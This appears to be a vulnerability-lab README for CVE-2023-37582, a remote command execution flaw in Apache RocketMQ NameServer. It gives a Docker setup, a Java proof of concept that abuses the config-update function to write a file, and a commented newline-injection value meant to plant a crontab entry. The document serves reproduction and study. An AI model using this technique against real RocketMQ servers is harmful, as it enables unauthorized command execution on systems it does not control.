# Apache RocketMQ Remote Command Execution Vulnerability (CVE-2023-37582)

The RocketMQ NameServer component still has a remote command execution vulnerability as the CVE-2023-33246 issue was not completely fixed in version 5.1.1.

When NameServer address are leaked on the extranet and lack permission verification, an attacker can exploit this vulnerability by using the update configuration function on the NameServer component to execute commands as the system users that RocketMQ is running as.

## Affected Version

- Apache RocketMQ 5.x <= 5.1.1
- Apache RocketMQ <= 4.9.6

## Usage

Run following command to startup the apache rocketmq, the NameServer and Broker was listing on `9876` and `10911`.

```bash
docker-compose up
```

### Poc of CVE-2023-37582

The poc below will write the configuration file of NameServer to `/tmp/rocketmq`,

```java
public class Main {
    public static void main(String[] args) throws Exception {
        Properties props = new Properties();
        // try to write as crontab
        // props.setProperty("productEnvName", "anything\\n1 * * * * {user} touch /tmp/crontab_success");
        props.setProperty("productEnvName", "anything");
        props.setProperty("configStorePath", "/tmp/rocketmq");
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
        admin.setNamesrvAddr("0.0.0.0:9876");
        admin.start();

        LinkedList<String> list = new LinkedList<>();
        list.add("127.0.0.1:9876");
        admin.updateNameServerConfig(props, list);

        admin.shutdown();
    }
}
```

After running, you will see the file `/tmp/rocketmq` with content

```
bindAddress=0.0.0.0
clientRequestThreadPoolNums=8
clientRequestThreadPoolQueueCapacity=50000
clusterTest=false
configStorePath=/tmp/rocketmq
defaultThreadPoolNums=16
defaultThreadPoolQueueCapacity=10000
enableAllTopicList=true
enableControllerInNamesrv=false
enableTopicList=true
kvConfigPath=/root/namesrv/kvConfig.json
listenPort=9876
needWaitForService=false
notifyMinBrokerIdChanged=false
orderMessageEnable=false
productEnvName=anything
returnOrderTopicConfigToBroker=true
rocketmqHome=/opt/rocketmq-all-5.1.0
scanNotActiveBrokerInterval=5000
serverAsyncSemaphoreValue=64
serverCallbackExecutorThreads=0
serverChannelMaxIdleTimeSeconds=120
serverOnewaySemaphoreValue=256
serverPooledByteBufAllocatorEnable=true
serverSelectorThreads=3
serverSocketBacklog=1024
serverSocketRcvBufSize=0
serverSocketSndBufSize=0
serverWorkerThreads=8
supportActingMaster=false
unRegisterBrokerQueueCapacity=3000
useEpollNativeSelector=false
waitSecondsForService=45
writeBufferHighWaterMark=0
writeBufferLowWaterMark=0
```

> Since the `org.apache.rocketmq.broker.filtersrv.FilterServerManager` was removed from `5.1.1`, you can try to exploit it with writing the content to a crontab file for command execution.

## Reference

1. https://lists.apache.org/thread/m614czxtpvlztd7mfgcs2xcsg36rdbnc
